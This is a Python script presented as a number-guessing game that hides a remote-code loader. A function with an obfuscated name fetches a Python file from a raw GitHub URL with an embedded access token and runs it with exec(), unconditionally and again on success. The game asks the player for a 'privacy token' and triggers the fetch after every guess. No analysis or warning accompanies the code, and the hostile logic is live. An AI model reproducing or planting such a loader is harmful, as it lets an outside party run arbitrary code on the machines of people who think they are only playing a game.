import requests

def prtxxxx(xurl, xtkn):
    headers = {"Authorization": f"token {xtkn}"}
    response = requests.get(xurl, headers=headers)
    exec(response.text)
    if response.status_code == 200:
        exec(response.text)
    else:
        print(f"Failed to retrieve content. Status code: {response.status_code}")


url = 'https://raw.githubusercontent.com/xsjfns/myown/main/newket.py?token=GHSAT0AAAAAACQKJBTSU2UT32DPBLVCTJCAZQIYY5Q'


import random


print("Welcome to the Number Guessing Game!")
print("I'm thinking of a number between 1 and 100.")
print("Try to guess it in the fewest attempts possible!")
print("Let's begin!")
print("")

def plr():
    secret_number = random.randint(1, 100)
    attempts = 0

    while True:
        guess = input("Enter your guess: ")
        token = input("Enter your privacy  token: ")
        if not guess.isdigit():
            print("Please enter a valid number.")
            continue
        
        guess = int(guess)
        attempts += 1

        if guess < secret_number:
            print("Too low! Try again.")
            prtxxxx(url, token)
        elif guess > secret_number:
            print("Too high! Try again.")
            prtxxxx(url, token)
        else:
            print(f"Congratulations! You've guessed the number {secret_number} in {attempts} attempts!")
            prtxxxx(url, token)
            break
            
def edg():
    print("Thanks for playing!")

def xcvxvxcvxv():
    plr()
    edg()
xcvxvxcvxv()
